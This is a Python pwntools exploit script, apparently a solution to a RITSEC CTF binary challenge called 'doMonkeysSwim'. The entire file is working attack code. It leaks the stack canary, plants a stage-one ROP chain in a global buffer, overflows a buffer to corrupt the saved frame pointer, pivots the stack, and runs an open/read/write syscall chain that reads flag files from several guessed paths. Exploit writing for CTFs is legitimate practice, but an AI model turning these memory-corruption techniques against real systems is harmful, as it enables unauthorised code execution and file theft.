#!/usr/bin/env python3
from pwn import *


HOST = "dms.ctf.ritsec.club"
PORT = 1400

BIN_PATH = "/workspace/chal/doMonkeysSwim"


def build_stage2(base: int, path: bytes, elf: ELF) -> bytes:
    pop_rdi = 0x401F43
    pop_rsi = 0x401F45
    pop_rdx = 0x401F47
    pop_rax = 0x401F49
    syscall = 0x41A986

    # fixed .bss scratch from static, non-PIE binary
    buf = base + 0x500
    path_addr = base + 0x700

    # ORW chain using raw syscalls
    chain = flat(
        base + 0x7F0,
        pop_rax,
        2,  # open
        pop_rdi,
        path_addr,
        pop_rsi,
        0,
        pop_rdx,
        0,
        syscall,
        pop_rax,
        0,  # read
        pop_rdi,
        3,  # expected first free fd after stdio
        pop_rsi,
        buf,
        pop_rdx,
        0x100,
        syscall,
        pop_rax,
        1,  # write
        pop_rdi,
        1,
        pop_rsi,
        buf,
        pop_rdx,
        0x100,
        syscall,
        pop_rax,
        60,  # exit
        pop_rdi,
        0,
        syscall,
    )
    return chain.ljust(0x700, b"\x00") + path + b"\x00"


def exploit_path(path: bytes) -> bytes:
    context.binary = ELF(BIN_PATH, checksec=False)
    elf = context.binary

    # Primitive constants from reversing
    bed = 0x4CCA60
    new_rbp = bed + 0x10
    stage2_base = 0x4CD100

    pop_rdi = 0x401F43
    pop_rsi = 0x401F45
    pop_rdx = 0x401F47
    pop_rbp = 0x4017D9
    leave_ret = 0x401A25
    read_fn = elf.symbols["read"]

    io = remote(HOST, PORT)

    # 1) Leak stack canary via monkey_see index 3
    io.recvuntil(b">> ", timeout=2)
    io.sendline(b"3")
    io.sendline(b"3")
    io.recvuntil(b"0x", timeout=2)
    canary = int(io.recvline(timeout=2).strip(), 16)
    io.recvuntil(b">> ", timeout=2)

    # 2) Write stage1 chain to global bed using monkey_swaperoo
    stage1 = bytearray(b"R" * 0x68)
    stage1[0x8:0x10] = p64(canary)
    stage1[0x10:0x18] = p64(0)

    chain = [
        pop_rdi,
        0,
        pop_rsi,
        stage2_base,
        pop_rdx,
        0x800,
        read_fn,
        pop_rbp,
        stage2_base,
        leave_ret,
    ]
    for i, qword in enumerate(chain):
        off = 0x18 + (i * 8)
        stage1[off : off + 8] = p64(qword)

    io.sendline(b"5")
    io.recvuntil(b"Swap this: ", timeout=2)
    io.send(stage1 + b"\n")
    io.recvuntil(b"With this: ", timeout=2)
    io.sendline(b"x")
    io.recvuntil(b">> ", timeout=2)

    # 3) Overflow in monkey_do to corrupt saved rbp of game frame
    io.sendline(b"4")
    io.recvuntil(b"Oo oo Aa AA?\n", timeout=2)
    overflow = b"A" * 24 + p64(canary) + p64(new_rbp)[:7] + b"\n"
    io.send(overflow)
    io.recvuntil(b">> ", timeout=2)

    # 4) Trigger leave;ret in game and feed stage2 ORW chain
    io.sendline(b"6")
    io.send(build_stage2(stage2_base, path, elf))
    out = io.recvrepeat(1.6)
    io.close()
    return out


def main() -> None:
    context.log_level = "error"
    candidates = [
        b"flag",
        b"flag.txt",
        b"/flag",
        b"/flag.txt",
        b"/home/ctf/flag",
        b"/home/ctf/flag.txt",
        b"/app/flag",
        b"/app/flag.txt",
    ]

    for path in candidates:
        try:
            data = exploit_path(path)
        except EOFError:
            print(f"[!] EOF con ruta: {path.decode(errors='ignore')}")
            continue
        except Exception as exc:
            print(f"[!] Error con ruta {path.decode(errors='ignore')}: {exc}")
            continue

        text = data.decode(errors="ignore")
        print(f"[*] Ruta probada: {path.decode(errors='ignore')}")
        print(text[:260].replace("\n", "\\n"))

        lowered = text.lower()
        if "flag{" in lowered or "dms{" in lowered or "ritsec{" in lowered:
            print("\n[+] FLAG ENCONTRADA")
            print(text)
            return

    print("[-] No se detectó flag con las rutas probadas.")


if __name__ == "__main__":
    main()
